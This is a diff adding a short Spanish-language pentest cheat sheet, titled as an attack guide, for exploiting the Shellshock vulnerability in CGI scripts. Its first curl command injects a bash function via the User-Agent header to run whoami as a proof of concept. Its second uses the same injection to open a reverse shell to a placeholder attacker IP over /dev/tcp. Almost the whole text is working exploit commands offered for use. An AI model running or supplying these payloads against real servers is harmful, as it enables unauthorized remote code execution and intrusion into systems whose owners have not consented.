@@ -1,0 +1,24 @@
+/////////////////////////////// ATAQUE  VULNS \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+==============================================================================
+                    << EXPLOTACIÓN DE VULNERABILIDAD SHELLSHOCK >>
+==============================================================================
+
+[+]------------------------[ DETECCIÓN ]----------------------------------[+]
+
+   [*] PRUEBA DE CONCEPTO
+   |=====================
+   |  ### Si el servidor es vulnerable, ejecutará el comando /usr/bin/whoami y
+   |  ### devolverá el resultado en la respuesta HTTP.
+   |  curl -s -X GET "http://$IP/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+
+[+]------------------------[ EXPLOTACIÓN ]--------------------------------[+]
+
+   [*] REVERSE SHELL
+   |================
+   |  ### Si se observa que el comando lanzado muestra un resultado, podemos
+   |  ### realizar una reverse shell:
+   |  curl -s -X GET "http://$IP/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1"
+
+==============================================================================
+                << FIN DE LA GUÍA DE ATAQUE SHELLSHOCK >>
+==============================================================================
